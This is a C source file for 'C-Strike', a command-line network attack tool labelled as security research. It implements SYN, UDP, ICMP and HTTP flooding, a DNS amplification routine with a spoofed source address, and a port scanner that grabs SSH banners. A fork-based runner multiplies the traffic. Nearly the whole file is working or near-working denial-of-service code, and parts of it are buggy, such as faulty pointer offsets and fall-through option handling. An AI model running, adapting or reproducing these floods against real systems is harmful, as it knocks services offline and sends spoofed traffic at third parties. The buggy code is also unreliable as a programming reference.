//C-Strike: a security research for flooding
//Copyright (C) 2025  Jan Kałucki
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netdb.h>
#include "C-Strike.h"

int opts;
extern int optind;
extern char* optarg;
unsigned int n_proc=4;
unsigned int duration=10;
unsigned int pkt_len =1000;
unsigned short port = 80;
char* port_range;
char* target = "127.0.0.1";
char* type ="UDP flooding";
char* src = "192.168.1.1";

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

unsigned char* rand_bytes(unsigned int size){
	srand(time(NULL));
	unsigned char* stream = malloc(size);
	for(unsigned int i = 0; i < size; i++){
		stream[i]=rand();
	}
	return stream;
}

void parse_url(const char *url, char *host, char *path) {
    if (strncmp(url, "http://", 7) == 0) {
        url += 7;
    }

    const char *path_start = strchr(url, '/');
    if (path_start) {
        strncpy(host, url, path_start - url);
        host[path_start - url] = '\0';
        strcpy(path, path_start);
    } else {
        strcpy(host, url);
        strcpy(path, "/");
    }
}

unsigned short random_ushort() {
	srand(time(NULL));
	return (unsigned short)((rand() << 8) | (rand() & 0xFF));
}

void generate_random_string(char *str, size_t length) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    size_t charset_size = sizeof(charset) - 1;

    for (size_t i = 0; i < length; i++) {
        int key = rand() % charset_size;
        str[i] = charset[key];
    }
    str[length] = '\0';
}

void get_target_addr(char* target, struct addrinfo *res, struct addrinfo *hints){
    struct addrinfo *p;
    int status = getaddrinfo(target,port,hints,&res);
    if (status != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return;
    }
    for (p = res; p != NULL; p = p->ai_next) {
        int sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sock == -1) continue;
        close(sock);
        break;
    }
}

int SYN_flood(char* target,char* src, unsigned short port,unsigned int msg_len, time_t duration){
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_RAW;
    hints.ai_protocol = IPPROTO_TCP;
    get_target_addr(target,res,&hints);
    int sock = socket(res->ai_family, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        return 1;
    }
    time_t end = time(NULL) + duration;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct ip6_hdr *ip6h;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    size_t size;

    if(res->ai_family == AF_INET){
    // Fill in IP Header
    struct sockaddr_in *dest = (struct sockaddr_in *) res;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.2");
    iph->daddr = dest->sin_addr.s_addr;
    size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->check = checksum((unsigned short *) datagram, iph->tot_len);
    }else if(res->ai_family == AF_INET6){
        struct sockaddr_in6 *dest = (struct sockaddr_in6 *) res;
        ip6h = (struct ip6_hdr *) datagram;
        inet_pton(AF_INET6, src, &ip6h->ip6_src);
        ip6h->ip6_dst = dest->sin6_addr;
        size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    }
    // Fill in TCP Header
    tcph->source = htons(random_ushort());
    tcph->dest = htons(80);
    tcph->seq = random();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->check = checksum((unsigned short *)datagram, size);
    while(time(NULL)<end){
        if (sendto(sock, datagram, iph->tot_len, 0,
               res->ai_addr, res->ai_addrlen) < 0) {
	perror("Send failed");
	return 2;
        } else {
            printf("SYN packet sent\n");
        }
    }
    close(sock);
    return 0;
}
int UDP_flood(char* target, char* src,unsigned short port,unsigned int msg_len, time_t duration){
	int sock = socket(AF_INET,SOCK_DGRAM , 0);
	if(sock < 0){
		perror("Failed to create socket.");
		return 1;
	}
	time_t end = time(NULL)+duration;
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(target);
	server.sin_port = htons(port);
	unsigned char* buf = rand_bytes(msg_len);
	while (time(NULL)<end) {
		if(sendto(sock, buf, msg_len, 0, (struct sockaddr*)&server, sizeof(server))<0){
			perror("Send failed");
			return 2;
		}
	}
	close(sock);

	return 0;
}
int ICMP_flood(char* target, char* src,unsigned short port,unsigned int msg_len, time_t duration){
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket error");
        return 1;
    }
    time_t end = time(NULL) + duration;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct icmp_header *icmph = (struct icmp_header *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in dest;

    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = inet_addr(target);

    // Fill in IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.2");
    iph->daddr = dest.sin_addr.s_addr;

    iph->check = checksum((unsigned short *) datagram, iph->tot_len);

    // Fill in ICMP Header
    icmph->type = 8;
    icmph->code = 0;
    icmph->checksum = 0;
    u_int16_t check = checksum((unsigned short *)icmph, sizeof(struct icmp_header));
    icmph->checksum = check;
    while(time(NULL)<end){
        if (sendto(sock, datagram, iph->tot_len, 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
	perror("Send failed");
	return 2;
        } else {
            printf("ICMP echo request packet sent\n");
        }
    }
    close(sock);
    return 0;
}
int HTTP_flood(char* target, char* src,unsigned short port, unsigned int msg_len, time_t duration){
    char host[256];
    char path[1024];
    parse_url(target, host, path);

    struct hostent *server = gethostbyname(host);
    if (!server) {
        fprintf(stderr, "Failed to resolve host: %s\n", host);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 2;
    }

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(80);
    serv_addr.sin_addr = *((struct in_addr *)server->h_addr);
    memset(&(serv_addr.sin_zero), 0, 8);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 3;
    }

    char request[2048];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n"
             "\r\n",
             path, host);
    time_t end = time(NULL) + duration;
    while(time(NULL)<end){
    send(sock, request, strlen(request), 0);
    }
    close(sock);
    return 0;
}

int port_scan(char* target, unsigned short port_min, unsigned short port_max){
    struct hostent *server = gethostbyname(target);
    if (!server) {
        fprintf(stderr,"Failed to resolve host: %s\n", target);
        return 1;
    }
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr = *((struct in_addr *)server->h_addr);
    memset(&(server_addr.sin_zero), 0, 8);
    for(int i = port_min; i<= port_max;i++){
        int sock = socket(AF_INET, SOCK_STREAM,0);
        if(sock < 0){
            perror("Failed to create socket");
            return 2;
        }
        char buffer[256];
        server_addr.sin_port = htons(i);
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            fprintf(stderr,"Connection failed: Port %d closed", i);
            close(sock);
            return 3;
        }
        else{
            printf("Port %d open.\n",i);
        }
        if(i == 22){
            ssize_t received = recv(sock, buffer, 255, 0);
            if (received < 0) {
                perror("Failed to read banner.");
                close(sock);
                return 4;
            }
            buffer[received] = '\0';
            printf("SSH Banner: %s\n", buffer);
        }
    }
    return 0;
}

int DNS_Amplification(char* target, char* src, unsigned short port, unsigned int msg_len, time_t duration){
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sock < 0){
        perror("Failed to create socket.\n");
        return 1;
    }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    time_t end = time(NULL) + duration;
    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct udphdr *udph = (struct udphdr *) (datagram + sizeof(struct iphdr));
    struct dns_header *dnsh = (struct dns_header *) (udph + sizeof(struct udphdr));
    struct dns_query *dnsq = (struct dns_query *) (dnsh + sizeof(struct dns_header));
    struct sockaddr_in dest;

    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(target);

    // Fill in IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 
        sizeof(struct dns_header) + sizeof(struct dns_query);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(src);
    iph->daddr = dest.sin_addr.s_addr;
    iph->check = checksum((unsigned short *) datagram, iph->tot_len);
    // Fill in UDP header
    udph->source = htons(random_ushort());
    udph->dest = dest.sin_port;
    udph->len = sizeof(struct udphdr) + sizeof(struct dns_header) +
        sizeof(struct dns_query);
    udph->check = 0;
    udph->check = checksum((unsigned short *) udph, sizeof(struct udphdr));
    //Fill in DNS header
    dnsh->transaction_id = htons(random_ushort());
    dnsh->flags = htons(0x100);
    dnsh->num_questions = 1;
    dnsh->num_answers = 0;
    dnsh->num_auth_rr = 0;
    dnsh->num_add_rr = 0;
    while(time(NULL)<end){
        char label[10];
        dnsq->label_len = 10;
        generate_random_string(label,10);
        dnsq->label = label;
        dnsq->tld_len = 3;
        dnsq->tld = "com";
        dnsq->type = 1;
        dnsq->class = 1;

        if (sendto(sock, datagram, iph->tot_len, 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
	        perror("Send failed");
	        return 2;
        } else {
            printf("ICMP echo request packet sent\n");
        }

    }
    return 0;
}

void run_processes(int n, int (*func)(char*, char*, unsigned short, unsigned int, time_t), 
char *target, char* src, unsigned short port, unsigned int msg_len, time_t duration) {
    for (int i = 0; i < n; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork failed\n");
            exit(EXIT_FAILURE);
        } else if (pid == 0) {
            func(target,src,port,msg_len,duration);
            exit(EXIT_SUCCESS);
        }
    }
    for (int i = 0; i < n; i++) {
        wait(NULL);
    }
}

int main(int argc, char** argv){
	//Target;type;n_proc;duration;packet_len
	while((opts = getopt(argc,argv,"T:t:s:p:n:d:l:"))!= EOF){
		switch(opts){
			case 'T':
				target = optarg;
			break;
			case 't':
				type = optarg;
			break;
            case 's':
                src = optarg;
            break;
			case 'p':
                if(!strcmp(type,"Scan")){
                    port_range = optarg;
                    break;
                }
				port = (unsigned short)atoi(optarg);
                break;
			case 'n':
				n_proc = (unsigned int)(atoi(optarg));
			break;
			case 'd':
				duration = (unsigned int)(atoi(optarg));
			case 'l':
				pkt_len = (unsigned int)(atoi(optarg));
			case '?':
				fprintf(stderr,
				"Usage: C-Strike [-T target] [-t type] [-s source] [-p port number] [-n n_processes] [-d duration] [-l packet length]");
				return 1;
			break;
		
		}
	}
	printf("target:%s,type:%s,n_proc:%d,duration:%d,pkt_len:%d",
		target, type, n_proc, duration, pkt_len);
	if(!strcmp(type, "TCP_SYN")){
		run_processes(n_proc, SYN_flood, target, src, port, pkt_len, duration);
	}
	else if (!strcmp(type, "UDP")) {
		run_processes(n_proc, UDP_flood, target, src, port, pkt_len, duration);
	}
	else if (!strcmp(type,"ICMP")) {
		run_processes(n_proc, ICMP_flood, target, src, port, pkt_len, duration);
	}
	else if (!strcmp(type,"HTTP")) {
		run_processes(n_proc, HTTP_flood, target, src, port, pkt_len, duration);
	}
    else if (!strcmp(type,"Scan")) {
        unsigned short port_min, port_max;
        if(sscanf(port_range,"%d-%d",&port_min,&port_max) != 2){
            perror("Failed to parse port range.\n");
            return 2;
        }
        if(port_max < port_min || port_max>65535){
            perror("Invalid port range.\n");
            return 3;
        }
        port_scan(target,port_min,port_max);
    }

	return 0;
}
